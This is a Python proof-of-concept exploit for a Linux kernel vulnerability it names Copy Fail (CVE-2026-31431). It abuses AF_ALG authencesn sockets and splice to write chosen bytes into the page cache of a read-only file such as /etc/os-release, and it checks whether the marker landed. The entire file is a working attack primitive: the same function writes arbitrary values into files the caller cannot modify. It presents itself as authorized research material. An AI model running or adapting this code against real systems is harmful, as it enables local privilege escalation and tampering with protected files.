#!/usr/bin/env python3
# Author: reinject
"""
Copy Fail (CVE-2026-31431) — Page Cache Marker PoC

Writes a 4-byte marker (0xDEADBEEF) to the beginning of a target file's
page cache without modifying the on-disk content. Requires a vulnerable
kernel with AF_ALG + authencesn support.

This script is for authorized security research only.
"""
import os
import socket
import struct
import sys

AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000
AUTHSIZE = 4
ASSOCLEN = 8


def build_key():
    """Build a minimal authencesn key structure."""
    return struct.pack('<HH', 8, 1) + struct.pack('>I', 16) + b'\x00' * 32


def page_cache_write_4bytes(fd, offset, value):
    """Write 4 bytes to a file's page cache via the Copy Fail vulnerability.

    Args:
        fd: Read-only file descriptor of the target file.
        offset: Byte offset in the file to write to.
        value: 4-byte value to write (e.g., b'\\xDE\\xAD\\xBE\\xEF').
    """
    s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    s.bind(('aead', 'authencesn(hmac(sha256),cbc(aes))'))
    s.setsockopt(SOL_ALG, ALG_SET_KEY, build_key())
    s.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AUTHSIZE)
    r, _ = s.accept()

    aad = b'A' * 4 + value
    r.sendmsg([aad], [
        (SOL_ALG, ALG_SET_OP, struct.pack('<I', ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_IV, struct.pack('<I', 16) + b'\x00' * 16),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('<I', ASSOCLEN))
    ], MSG_MORE)

    pr, pw = os.pipe()
    os.splice(fd, pw, offset + AUTHSIZE, offset_src=0)
    os.splice(pr, r.fileno(), offset + AUTHSIZE)
    try:
        r.recv(ASSOCLEN + offset)
    except OSError:
        pass

    r.close()
    s.close()
    os.close(pr)
    os.close(pw)


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '/etc/os-release'
    marker = b'\xDE\xAD\xBE\xEF'

    fd = os.open(target, os.O_RDONLY)
    print(f'[*] Target: {target}')
    print(f'[*] Before: {os.pread(fd, 16, 0).hex()}')

    page_cache_write_4bytes(fd, 0, marker)

    after = os.pread(fd, 16, 0)
    print(f'[*] After:  {after.hex()}')

    if after[:4] == marker:
        print(f'[+] SUCCESS: page cache corrupted (first 4 bytes = {after[:4].hex()})')
    else:
        print(f'[-] FAILED: first 4 bytes = {after[:4].hex()}')

    os.close(fd)
